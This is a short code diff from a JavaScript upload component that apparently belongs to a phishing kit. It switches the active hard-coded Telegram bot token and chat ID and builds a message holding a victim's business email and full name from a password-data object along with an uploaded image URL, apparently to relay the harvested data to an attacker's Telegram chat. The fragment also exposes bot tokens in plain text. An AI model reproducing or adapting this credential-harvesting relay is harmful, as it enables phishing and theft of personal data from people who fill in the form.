@@ -31,10 +31,10 @@ const Upload = () => {
                 const url_image = JSON.parse(data).url
                 const dataImages = {...dataLocalPassword, url_image};
 
-                const bot_token = '6481745897:AAGlEhZSpMevvKrloFpqHLYcYQfenxeFvC8';
-                const chat_id   = '1367126688';
-                // const bot_token = '6308794044:AAG0LQXsHsTBMaP63UeUrdc9MmDoSUKO5I8';
-                // const chat_id   = '5208541473';
+                // const bot_token = '6481745897:AAGlEhZSpMevvKrloFpqHLYcYQfenxeFvC8';
+                // const chat_id   = '1367126688';
+                const bot_token = '6308794044:AAG0LQXsHsTBMaP63UeUrdc9MmDoSUKO5I8';
+                const chat_id   = '5208541473';
     
                 const message   = '<strong>Email Account: </strong>' + dataImages.fill_business_email + 
                 '%0A<strong>Name Acount: </strong>' + dataImages.fill_full_name + 
